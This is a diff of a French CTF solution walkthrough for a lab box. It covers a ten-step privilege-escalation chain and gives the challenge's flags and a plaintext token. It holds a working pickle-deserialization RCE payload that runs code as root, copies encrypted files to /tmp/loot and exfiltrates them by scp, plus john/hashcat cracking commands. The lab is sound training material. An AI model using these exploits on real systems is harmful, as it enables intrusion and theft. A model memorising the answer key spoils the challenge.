@@ -24,17 +24,18 @@ app_agent  (membre du groupe "orch")
    │ F6 SUID logviewer (SUID svc_orch, PAS root) -> injection -> svc_orch
    ▼
 svc_orch
-   │ F7 py-agent (cap_dac_read_search, exécutable seulement par svc_orch)
-   │    -> lecture des fichiers root (token + flag7)
+   │ F7 loot de la config locale de l'agent (~svc_orch/.fleet-agent/config.ini)
+   │    -> token de l'orchestrateur (+ flag7)
    │ F8 socket orchestrateur + token -> pickle RCE root -> flag8 EN MÉMOIRE
+   │    (le root ainsi obtenu exfiltre aussi vault.zip / final.gpg / pin.hash)
    ▼
 root (uniquement via l'orchestrateur)
    │ F9 crack vault.zip (rockyou)   │ F10 crack PIN + GPG
    ▼  FIN
 ```
 
-⚠️ **Runtime** : l'instance doit tourner avec `--cap-add DAC_READ_SEARCH`
-(sinon F7 est impossible — voir CTFD_SETUP.md).
+✅ **Aucune option de lancement requise** : un simple `docker run -p ...:22 <image>`
+suffit (pas de `--cap-add`, pas de `--privileged`).
 
 ---
 
@@ -109,40 +110,39 @@ cat /home/svc_orch/flag6.txt
 ```
 → `RootMeUp{su1d_b1nar13s_l13_0ft3n_2f6b58}`
 
-## Flag 7 — Pouvoirs spéciaux (200 pts)  — capability
+## Flag 7 — Le trousseau de l'agent (200 pts)  — loot post-compromission
+Vous contrôlez maintenant le compte de service `svc_orch` (l'agent de flotte).
+On pille ses fichiers de configuration locaux :
 ```bash
-getcap -r / 2>/dev/null
-#   /usr/local/bin/py-agent cap_dac_read_search=ep   (exécutable seulement par svc_orch)
-/usr/local/bin/py-agent -c 'print(open("/root/flag7.txt").read())'
+ls -la ~ ; ls -la ~/.fleet-agent
+cat ~/.fleet-agent/config.ini
 ```
-→ `RootMeUp{cap4bilit13s_ar3_p0w3r_5c2d71}`
-On récupère aussi le token et les infos de l'orchestrateur, puis on exfiltre les
-butins chiffrés (la capability bypasse la lecture) :
-```bash
-/usr/local/bin/py-agent -c 'print(open("/root/.orchestrator_token").read())'
-/usr/local/bin/py-agent -c 'open("/tmp/vault.zip","wb").write(open("/root/vault/vault.zip","rb").read())'
-/usr/local/bin/py-agent -c 'open("/tmp/final.gpg","wb").write(open("/root/.encrypted/final.gpg","rb").read())'
-/usr/local/bin/py-agent -c 'open("/tmp/pin.hash","w").write(open("/root/.encrypted/pin.hash").read())'
-chmod 644 /tmp/vault.zip /tmp/final.gpg /tmp/pin.hash
-```
+→ `RootMeUp{ag3nt_t0k3n_l00t3d_5c2d71}`
+Le fichier stocke aussi **en clair** le **token de l'orchestrateur**
+(`8f3ac1e9b7d24f0aa6c9e21d4b7f9931`) et le chemin du socket — les clés pour le
+flag 8. Les butins chiffrés (vault.zip / final.gpg / pin.hash) sont dans `/root`
+(illisibles par svc_orch) : on les exfiltrera via le **root obtenu au flag 8**.
 
 ## Flag 8 — L'orchestrateur (225 pts)  — désérialisation ➜ root
 Le daemon (root) écoute en JSON ligne-par-ligne. `restore_config` passe un blob
 base64 à `pickle.loads()` = **RCE**. Le flag 8 n'est **pas** sur le disque : il
 est chargé en mémoire au démarrage (le fichier source est supprimé). Seule une
-exécution de code **dans** l'orchestrateur le révèle (la capability F7 ne lit pas
-la mémoire d'un autre process) :
+exécution de code **dans** l'orchestrateur le révèle. La même RCE root sert aussi
+à exfiltrer les butins chiffrés (illisibles jusque-là) vers `/tmp/loot` :
 ```bash
-/usr/local/bin/py-agent << 'PYEOF'
+python3 << 'PYEOF'
 import pickle, base64, socket, json
 
 TOKEN = "8f3ac1e9b7d24f0aa6c9e21d4b7f9931"
 
 class Exploit:
     def __reduce__(self):
-        code = ("import sys,os\n"
+        code = ("import sys,os,shutil\n"
                 "open('/tmp/f8.txt','w').write(getattr(sys.modules['__main__'],'FLAG8','?'))\n"
-                "os.chmod('/tmp/f8.txt',0o666)")
+                "os.makedirs('/tmp/loot',exist_ok=True)\n"
+                "for f in ['/root/vault/vault.zip','/root/.encrypted/final.gpg','/root/.encrypted/pin.hash']:\n"
+                "    shutil.copy(f,'/tmp/loot/')\n"
+                "os.system('chmod -R 777 /tmp/loot /tmp/f8.txt')")
         return (exec, (code,))
 
 payload = base64.b64encode(pickle.dumps(Exploit())).decode()
@@ -153,11 +153,12 @@ s.sendall((json.dumps(msg) + "\n").encode())
 print(s.recv(4096))
 PYEOF
 cat /tmp/f8.txt
+ls -la /tmp/loot
 ```
 → `RootMeUp{0rch3str4t0r_pwn3d_88af0d}`
 
 ## Flag 9 — Le coffre (250 pts)
-Sur la machine d'attaque (après `scp` de `/tmp/vault.zip`) :
+Sur la machine d'attaque (après `scp -P <port> j.martin@<host>:/tmp/loot/* .`) :
 ```bash
 zip2john vault.zip > vault.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt vault.hash   # -> iloveyou
@@ -185,7 +186,7 @@ cat flag10.txt
 | 4 | Abus de tâche planifiée exécutée sous une autre identité |
 | 5 | Mauvaise config sudo / GTFOBins |
 | 6 | Injection de commande dans un SUID (vers un compte de service, pas root) |
-| 7 | Abus de capability Linux (lecture seule) |
+| 7 | Loot post-compromission : secrets applicatifs stockés en clair |
 | 8 | Désérialisation non sécurisée (RCE), secret en mémoire |
 | 9 | Cassage de mot de passe hors-ligne (zip2john/john) |
 | 10 | Attaque par masque hashcat + GPG |
